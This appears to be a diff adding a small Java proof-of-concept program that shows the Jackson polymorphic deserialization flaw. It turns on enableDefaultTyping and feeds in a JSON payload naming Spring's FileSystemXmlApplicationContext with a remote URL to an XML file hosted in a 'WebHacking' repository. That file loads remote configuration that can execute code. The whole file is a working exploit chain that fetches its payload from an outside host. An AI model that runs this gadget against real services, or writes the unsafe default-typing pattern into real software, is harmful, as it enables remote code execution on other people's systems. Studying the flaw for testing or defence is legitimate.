@@ -1,0 +1,28 @@
+package com.linecorp;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+
+
+
+public class App
+{
+    public static void main( String[] args ) throws IOException 
+    {
+    	String value = "{\"id\":123, \"obj\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"https://raw.githubusercontent.com/bindon/WebHacking/master/spel.xml\"]}\r\n"; 
+		System.out.println("creating objectmapper");
+		ObjectMapper om = new ObjectMapper();
+		om.enableDefaultTyping();
+		System.out.println(value);
+		inner i = om.readValue(value, inner.class);
+		System.out.println("done");
+    }
+}
+
+class inner {
+	public int id;
+	public Object obj;
+}
